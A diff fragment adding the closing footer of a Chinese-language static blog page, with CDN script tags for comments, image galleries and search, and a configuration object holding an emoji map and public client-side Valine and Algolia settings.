+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
